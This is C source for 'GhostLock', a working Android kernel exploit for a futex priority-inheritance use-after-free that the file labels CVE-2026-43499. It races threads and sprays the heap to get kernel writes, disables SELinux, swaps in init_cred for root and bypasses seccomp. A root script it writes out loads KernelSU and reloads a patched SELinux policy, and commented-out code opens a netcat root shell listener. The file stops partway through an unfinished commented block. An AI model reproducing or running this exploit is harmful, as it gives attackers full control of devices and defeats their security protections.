/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 */

#include "common.h"
#include <ctype.h>
#include <linux/perf_event.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/utsname.h>

static char g_home_dir[256] = "/data/local/tmp";
static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";
static char g_ksu_log_path[320] = "/data/local/tmp/.ghostlock_ksu.log";

/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF 0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF 0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG 0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif
static void publish_target(void) {
  g_init_cred_image = INIT_CRED;
  p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
  pr_info("kernel_phys_load=0x%llx\n", (unsigned long long)p0_kernel_phys_load);
  pr_info("init_cred image=%016zx alias=%016zx\n", (size_t)g_init_cred_image,
          (size_t)data_addr(g_init_cred_image));
}

static int select_target(void) {
  struct utsname uts;
  if (uname(&uts) < 0)
    return -1;
  pr_info("kernel: %s\n", uts.release);
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n", TARGET_KERNEL_RELEASE,
             uts.release);
    return -1;
  }
  pr_success("target: %s\n", TARGET_KERNEL_RELEASE);
  publish_target();
  return 0;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label)                                                           \
  do {                                                                         \
    pr_info("[T+%.0fms] %s\n", timer_ms(), label);                             \
    log_sync();                                                                \
  } while (0)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int consumer_ready;
atomic_int main_route_delay_usec;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(WAITER_CORE);
#ifdef GHOSTLOCK_TARGET_4_19
  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGUSR1);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);
#endif
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_warning("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started))
    usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
#ifdef GHOSTLOCK_TARGET_4_19
  do_sigreturn_fake_lock_route();
#else
  if (tcp_route_selected()) {
    do_tcp_fake_lock_route();
  } else {
    do_pselect_fake_lock_route();
  }
#endif
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done))
    usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(OWNER_CORE);
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0)
    pr_warning("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready))
    usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop))
    sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
  int seen = 0;
  atomic_store(&consumer_ready, 1);
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      /* The plant->PI-walk window is the part that must not be interrupted by
       * a timer tick on the waiter's kernel stack.  Any sleep here lets the
       * waiter sit in user mode with a live plant for a full tick period, so
       * keep this thread hot and react in microseconds. */
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0)
        usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq)
          break;
        /* No logging or other syscalls between arming inflight and entering
         * sched_setattr: every user-space instruction here is time the waiter
         * spends with the planted waiter exposed to IRQ stack reuse. */
        atomic_store(&consumer_inflight, 1);
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        int consumer_nice = PSELECT_CONSUMER_NICE;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        long fret = 0;
        int fret_errno = 0;
        if (sched_ret != 0) {
          /* Rare fallback.  Keep it short: the waiter is still spinning with
           * the plant live while this runs. */
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 1000000};
          fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          fret_errno = errno;
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0)
          atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        if (sched_ret != 0)
          pr_warning("consumer sched ret=%ld errno=%d futex ret=%ld errno=%d\n",
                     sched_ret, sched_errno, fret, fret_errno);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&consumer_ready, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  route_last_step = 0;
  route_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
#ifdef GHOSTLOCK_TARGET_4_19
  install_sigreturn_plant_handler();
#endif
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started) ||
         !atomic_load(&consumer_ready))
    usleep(1000);
  usleep(50000);
  errno = 0;
  long rret =
      futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("main FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d\n", rret, errno);
  while (!atomic_load(&route_done))
    usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && route_last_step == 0;
}

/* a target outside the direct map is wrong by construction, so it is worth
 * neither a spray nor a retry */
static int in_direct_map(uintptr_t target) {
#ifdef GHOSTLOCK_TARGET_4_19
  /* 4.19 kernel space starts at VA_START; both the randomized linear map and
   * the KASLR-slid image live above it.  The exact linear base is randomized
   * by memstart_addr, so accepting the whole kernel half is intentional. */
  return target >= 0xffffff8000000000ULL && target < 0xffffffffffffffffULL;
#else
  return target > DIRECT_MAP_BASE && target < g_direct_map_end;
#endif
}

/* perf registers also contain image/vmap pointers; only the linear-map half
 * is useful for the task_struct vote on 4.19. */
static int in_perf_direct(uintptr_t target) {
#ifdef GHOSTLOCK_TARGET_4_19
  return target >= 0xffffffc000000000ULL;
#else
  return in_direct_map(target);
#endif
}

static int do_one_write(uintptr_t target, const char *desc, int mode,
                        int leaf) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode,
          leaf);
  if (!in_direct_map(target)) {
    pr_warning("  target is outside the direct map, not writing\n");
    return 0;
  }
  /* Both transports write *(target) := value through the erase left-only
   * relink: waiter words are {pc = value, right = 0, left = target} and
   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page();
  if (!page_base) {
    pr_warning("  heap spray failed\n");
    clear_pselect_write();
    return 0;
  }
  TIMER("  heap spray done");
  /* only the leaf arm stores zero, and the value arm does not, so a leaf
   * payload fired at a value target zeroes it */
  int arm_matches = leaf ? (fake_right == 0) : (fake_right != 0);
  if (!arm_matches) {
    pr_warning("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
               "write\n",
               leaf, fake_right);
    clear_pselect_write();
    return 0;
  }
  int routed = run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0)
    return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status)
    return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain)
      return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0)
        drain[n++] = pid;
      else
        break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

int g_core_main = 0;
int g_core_consumer = 1;

void init_cpu_config(void) {
  g_core_main = 0;
  g_core_consumer = 1;

  const char *s = getenv("GHOSTLOCK_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_main = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
    }
  }
  s = getenv("GHOSTLOCK_CONSUMER_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_consumer = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
                 g_core_consumer);
    }
  } else {
    g_core_consumer = g_core_main + 1;
  }

  if (g_core_main == g_core_consumer) {
    pr_warning("main and consumer cores are the same (%d); falling back\n",
               g_core_main);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
      (!CPU_ISSET(g_core_main, &allowed) ||
       !CPU_ISSET(g_core_consumer, &allowed))) {
    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
               g_core_main, g_core_consumer);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
}

static void init_runtime_paths(void) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0])
    home = getenv("TMPDIR");
  if (!home || !home[0])
    home = "/data/local/tmp";

  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
  size_t n = strlen(g_home_dir);
  while (n > 1 && g_home_dir[n - 1] == '/') {
    g_home_dir[--n] = '\0';
  }
  snprintf(g_root_script_path, sizeof(g_root_script_path),
           "%s/.ghostlock_root.sh", g_home_dir);
  const char *ksu_log = getenv("GHOSTLOCK_KSU_LOG");
  if (ksu_log && ksu_log[0]) {
    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path), "%s", ksu_log);
  } else {
    snprintf(g_ksu_log_path, sizeof(g_ksu_log_path), "%s/.ghostlock_ksu.log",
             g_home_dir);
  }
  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
}

/* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
 * A nested bank lies inside its parent, so it cannot widen either bound. */
static int iomem_map_span(FILE *f, uint64_t *map_span) {
  unsigned long long base = 0, top = 0;
  char *line = NULL;
  size_t cap = 0;
  int found = 0;

  while (getline(&line, &cap, f) > 0) {
    size_t len = strlen(line);
    unsigned long long a, b;
    int used = 0;

    while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
      line[--len] = '\0';
    }
    /* %n pins the match to the whole line, since sscanf returns 2 even when a
     * trailing literal mismatches */
    if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
        used == (int)len) {
      if (!found || a < base) {
        base = a;
        found = 1;
      }
      if (b + 1 > top)
        top = b + 1;
    }
  }
  free(line);

  /* the map starts at the dram base the kernel rounded down to a gib, which is
   * what memstart_addr holds */
  base &= ~((1ULL << 30) - 1);
  if (!found || top <= base)
    return 0;
  *map_span = top - base;
  return 1;
}

/* A rooted run leaves its /proc/iomem in the home dir, the only source for this
 * unit's direct map size. */
static void apply_iomem_cache(void) {
  char path[300], stamp[128] = "";
  uint64_t span = 0;
  int ok = 0;
  const char *release = TARGET_KERNEL_RELEASE;

  snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
  FILE *f = fopen(path, "r");
  if (f) {
    /* the first line names the release that wrote the dump */
    if (fgets(stamp, sizeof(stamp), f)) {
      stamp[strcspn(stamp, "\r\n")] = '\0';
      ok = strncmp(stamp, "# ", 2) == 0 && strcmp(stamp + 2, release) == 0 &&
           iomem_map_span(f, &span);
    }
    fclose(f);
  }

  /* the base is rounded down to a gib, so a span under that holds no real bank,
   * and the span has to cover the dram the unit reports. it also stays inside
   * the bound the built-in geometry already uses, so a measured end can only
   * narrow what this build would otherwise trust. an unmeasurable ram rejects
   * the dump */
  long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
  uint64_t dram =
      (pages > 0 && page_sz > 0) ? (uint64_t)pages * (uint64_t)page_sz : 0;
  if (!ok || !dram || span < (1ULL << 30) || span < dram ||
      span >= DIRECT_MAP_END - DIRECT_MAP_BASE) {
    pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
    return;
  }

  g_direct_map_end = DIRECT_MAP_BASE + span;
  pr_info("iomem cache: direct_map_end=%016llx\n",
          (unsigned long long)g_direct_map_end);
}

/* The W2 worker runs with init_cred (kernel SID).  Under enforcing it may not
 * be allowed to write the shell_data_file exploit log, so report diagnostics
 * through /dev/kmsg instead; the harness reads them with su. */
static void worker_kmsg(const char *tag, long v) {
  int fd = open("/dev/kmsg", O_WRONLY | O_CLOEXEC);
  if (fd < 0)
    return;
  char buf[128];
  int n = snprintf(buf, sizeof(buf), "ghostlock worker %s=%ld\n", tag, v);
  if (n > 0) {
    ssize_t w = write(fd, buf, (size_t)n);
    (void)w;
  }
  close(fd);
}

static void write_root_script(void) {
  char script[8192];
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n", g_root_script_path,
               errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG='%s'\n"
      "echo \"[*] root script start real_uid=$(id -ru) euid=$(id -u) real_gid=$(id -rg) egid=$(id -g)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] self: uid=$(id -ru)/$(id -u) gid=$(id -rg)/$(id -g)\" >>\"$LOG\"\n"
      "echo \"[*] proc: $(grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then echo '[!] temp su unavailable; aborting' >>\"$LOG\"; exit 1; fi\n"

      "KSU_LKM=/data/local/tmp/kernelsu_ruby.ko\n"
      "KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"

      "if [ \"${GHOSTLOCK_DISABLE_MODULES:-0}\" = \"1\" ]; then\n"
      "  echo '[*] safe mode: disabling modules' >>\"$LOG\"\n"
      "  n=0\n"
      "  for m in /data/adb/modules/*/; do\n"
      "    [ -d \"$m\" ] || continue\n"
      "    m=${m%/}\n"
      "    if touch \"$m/disable\" 2>/dev/null; then n=$((n+1)); echo \"  disabled $m\" >>\"$LOG\"; fi\n"
      "  done\n"
      "  echo \"[*] safe mode: $n disabled\" >>\"$LOG\"\n"
      "fi\n"

      "KSU_READY=0\n"
      "if [ -n \"$KSUD\" ] && [ -f \"$KSU_LKM\" ]; then\n"
      "  \"$KSUD\" insmod \"$KSU_LKM\" >>\"$LOG\" 2>&1\n"
      "  for i in $(seq 1 50); do\n"
      "    if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "    sleep 0.1\n"
      "  done\n"
      "else\n"
      "  echo '[!] ksud or .ko missing' >>\"$LOG\"\n"
      "fi\n"

      "if [ \"$KSU_READY\" -ne 1 ]; then echo '[!] KernelSU not loaded' >>\"$LOG\"; exit 1; fi\n"
      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"


      "# step 1: restore policy\n"
      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
      "  exit 1\n"
      "}\n"
      "trap 'rm -f \"$POLICY\"' EXIT\n"
      "prepare_policy() {\n"
      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
      "  case \"$HEADER\" in\n"
      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
      "  esac\n"
      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
      "  [ -n \"$CONFIG\" ] || return 1\n"
      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
      "}\n"
      "KSU_ALREADY=0\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "fi\n"
      "FIXUP_RC=1\n"  
      "# a reload unlabels running processes, init exits 127 on the stale SID\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
      "    sleep 2\n"
      "    continue\n"
      "  fi\n"
      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    break\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "rm -f \"$POLICY\"\n"

      /*"# Start the independent root listener before re-enforcing SELinux.  The\n"
      "# worker was re-labelled to u:r:shell:s0, which is allowed to bind the\n"
      "# loopback port.  Fall back to runcon and then Magisk su if needed.\n"
      "SHELL_PORT=55555\n"
      "NC_LOG=\"$HOME_DIR/.ghostlock_nc.log\"\n"
      "start_nc() {\n"
      "  mode=\"$1\"; shift\n"
      "  \"$@\" </dev/null >\"$NC_LOG.$mode\" 2>&1 &\n"
      "  p=$!\n"
      "  sleep 1\n"
      "  if kill -0 \"$p\" 2>/dev/null; then\n"
      "    echo \"[+] root shell listener 127.0.0.1:$SHELL_PORT mode=$mode pid=$p\" >>\"$LOG\"\n"
      "    return 0\n"
      "  fi\n"
      "  echo \"[!] listener mode=$mode died: $(tr '\\n' ' ' <\"$NC_LOG.$mode\" 2>/dev/null)\" >>\"$LOG\"\n"
      "  return 1\n"
      "}\n"
      "if [ -x /system/bin/nc ]; then\n"
      "  if ! start_nc direct /system/bin/setsid /system/bin/nc -L -s 127.0.0.1 -p \"$SHELL_PORT\" /system/bin/sh -i; then\n"
      "    if [ -x /system/bin/runcon ]; then\n"
      "      start_nc shell /system/bin/setsid /system/bin/runcon u:r:shell:s0 /system/bin/nc -L -s 127.0.0.1 -p \"$SHELL_PORT\" /system/bin/sh -i || {\n"
      "        SU=$(command -v su 2>/dev/null)\n"
      "        if [ -n \"$SU\" ] && [ -x \"$SU\" ]; then\n"
      "          start_nc su /system/bin/setsid \"$SU\" -c \"setsid /system/bin/nc -L -s 127.0.0.1 -p $SHELL_PORT /system/bin/sh -i\" || true\n"
      "        fi\n"
      "      }\n"
      "    fi\n"
      "  fi\n"
      "else\n"
      "  echo '[!] /system/bin/nc missing; no root shell listener' >>\"$LOG\"\n"
      "fi\n"*/

      "if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != \"1\" ]; then\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null || echo '[!] could not enforce' >>\"$LOG\"\n"
      "fi\n"
      "exit 0\n",
    
      /*"#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG='%s'\n"
      "KSUD=\"$HOME_DIR/ksud\"\n"
      "echo \"[*] root script start real_uid=$(id -ru) euid=$(id -u) real_gid=$(id -rg) egid=$(id -g)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] self: uid=$(id -ru)/$(id -u) gid=$(id -rg)/$(id -g)\" >>\"$LOG\"\n"
      "echo \"[*] proc: $(grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "echo \"[*] log: $(ls -ln \"$LOG\" 2>/dev/null)\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then\n"
      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "# The W1 write may have failed; the committed cred still carries the\n"
      "# kernel SID, so try to drop SELinux before starting the listener.\n"
      "setenforce 0 2>/dev/null\n"
      "echo \"[*] enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\" >>\"$LOG\"\n"
      "# Listener starts before the KernelSU/KMI gate: even when ksud cannot\n"
      "# load on this non-GKI kernel, the exploit root shell stays reachable\n"
      "# until reboot. -t is rejected with -l; -L forks per connection.\n"
      "# The W2 cred carries the kernel SID, which cannot bind under enforcing;\n"
      "# fall back to the shell domain (same uid 0, net-bind allowed) and then\n"
      "# to the Magisk su domain.\n"
      "SHELL_PORT=55555\n"
      "NC_LOG=\"$HOME_DIR/.ghostlock_nc.log\"\n"
      "start_nc() {\n"
      "  mode=\"$1\"; shift\n"
      "  \"$@\" </dev/null >\"$NC_LOG.$mode\" 2>&1 &\n"
      "  p=$!\n"
      "  sleep 1\n"
      "  if kill -0 \"$p\" 2>/dev/null; then\n"
      "    echo \"[+] root shell listener 127.0.0.1:$SHELL_PORT mode=$mode pid=$p\" >>\"$LOG\"\n"
      "    return 0\n"
      "  fi\n"
      "  echo \"[!] listener mode=$mode died: $(tr '\\n' ' ' <\"$NC_LOG.$mode\" 2>/dev/null)\" >>\"$LOG\"\n"
      "  return 1\n"
      "}\n"
      "if [ -x /system/bin/nc ]; then\n"
      "  if ! start_nc direct /system/bin/setsid /system/bin/nc -L -s 127.0.0.1 -p \"$SHELL_PORT\" /system/bin/sh -i; then\n"
      "    if [ -x /system/bin/runcon ]; then\n"
      "      start_nc shell /system/bin/setsid /system/bin/runcon u:r:shell:s0 /system/bin/nc -L -s 127.0.0.1 -p \"$SHELL_PORT\" /system/bin/sh -i || {\n"
      "        SU=$(command -v su 2>/dev/null)\n"
      "        if [ -n \"$SU\" ] && [ -x \"$SU\" ]; then\n"
      "          start_nc su /system/bin/setsid \"$SU\" -c \"setsid /system/bin/nc -L -s 127.0.0.1 -p $SHELL_PORT /system/bin/sh -i\" || true\n"
      "        fi\n"
      "      }\n"
      "    fi\n"
      "  fi\n"
      "else\n"
      "  echo '[!] /system/bin/nc missing; no root shell listener' >>\"$LOG\"\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*//*me.weishu.kernelsu.pr*//*lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      //"  KSUD=$(find /data/app -path '*//*me.weishu.kernelsu-*//*lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*//*com.resukisu.resukisu*//*lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*//*com.kowx712.supermanager*//*lib/arm64/libksud.so' 2>/dev/null | head -1)\n" // added /* here after every /* so this can be kept as reference
      "fi\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      // the rename is atomic, so a failed read leaves the old dump in place
      "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
      "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
      "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
      "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
      "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
      "else\n"
      "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
      "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
      "fi\n"
      "KVER=$(uname -r | cut -d. -f1-2)\n"
      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
